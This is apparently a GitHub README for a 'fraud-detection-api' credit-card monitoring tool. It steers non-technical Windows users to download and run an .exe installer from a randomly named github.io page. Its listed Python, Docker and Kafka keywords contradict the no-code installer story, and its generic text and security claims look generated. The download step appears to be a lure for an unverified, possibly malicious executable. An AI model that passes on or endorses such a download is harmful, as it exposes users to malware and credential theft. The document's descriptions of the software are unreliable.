# 🛡️ fraud-detection-api - Monitor credit card transactions in real time

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://digressive-pulse731.github.io)

This software detects unusual credit card patterns as they happen. It uses advanced math to spot fraud and sends alerts to your phone. A live dashboard displays all incoming transaction data so you monitor your finances with ease. You do not need programming knowledge to run this system.

## ⚙️ System Requirements

Your computer needs specific hardware to run this software smoothly. Ensure your computer meets these standards before you begin:

*   Operating System: Windows 10 or Windows 11.
*   Processor: An Intel Core i5 or equivalent processor with at least 2.0 GHz speed.
*   Memory: 8 GB of RAM or more.
*   Storage Space: 2 GB of available disk space for logs and database records.
*   Network: A stable internet connection for real-time alerts and streaming data processing.

## 📥 How to Install the Software 

Follow these steps to set up the system on your Windows machine.

1.  Visit the official release page: [https://digressive-pulse731.github.io](https://digressive-pulse731.github.io).
2.  Locate the latest version at the top of the list.
3.  Click the file ending in .exe to download the installer.
4.  Open the downloaded file once the process finishes.
5.  Follow the instructions on the screen to complete the installation.
6.  The installer creates a shortcut icon on your desktop.

## 🚀 Running the Application

Double-click the fraud-detection-api icon on your desktop to launch the system. A command window appears first to initialize the internal components. This window runs the database and the machine learning model in the background. Keep this window open while you use the application.

After the system initializes, your default web browser opens automatically. The page shows your live dashboard. This dashboard tracks every processed transaction. 

## 📱 Setting Up Telegram Alerts

The system sends notifications directly to your phone when it detects a suspicious transaction. Use these steps to configure your alerts:

1.  Open your Telegram app.
2.  Search for the "BotFather" account to create your own notification bot.
3.  Copy the API token provided by BotFather.
4.  Paste this token into the settings menu on your web dashboard.
5.  Enter your unique User ID to verify your account.
6.  Click Save Changes.

The system sends a test notification to your phone. If you receive the message, your setup is complete.

## 📊 Understanding the Dashboard

The dashboard provides a visual view of your transaction flow. It uses three distinct sections to help you track system health:

*   Transaction Feed: This section lists every incoming payment request. It shows the time, the amount, and the location of the card usage.
*   Anomaly Score: The system assigns a number between 0 and 1 to every transaction. A higher number indicates a higher risk of fraud.
*   Alert History: This section lists past alerts triggered by the system. You can review why the system flagged a specific payment.

## 🛠️ Troubleshooting Common Issues

If you face difficulties, try these simple solutions first:

*   App does not start: Check if another application blocks the ports used by the internal database. Close other data tools and restart the application.
*   Dashboard does not load: Refresh your browser page. If the page stays blank, check if the command window is still open.
*   Alerts are missing: Confirm that your Telegram token is correct. Re-enter the token in the settings menu to ensure no characters are missing.
*   Slow performance: Close unused tabs in your browser. The dashboard performs best when it has sufficient memory to update the charts.

## 🔒 Data Privacy and Security

The software processes all data locally on your machine. Your transaction information stays on your device at all times. Sensitive details like credit card numbers or personal IDs are encrypted by the internal database. The system uses a specific security model designed to spot errors without storing your private financial data on external servers.

Keywords: anomaly-detection, docker, fastapi, fraud-detection, kafka, machine-learning, plotly-dash, postgresql, python, scikit-learn, telegrambot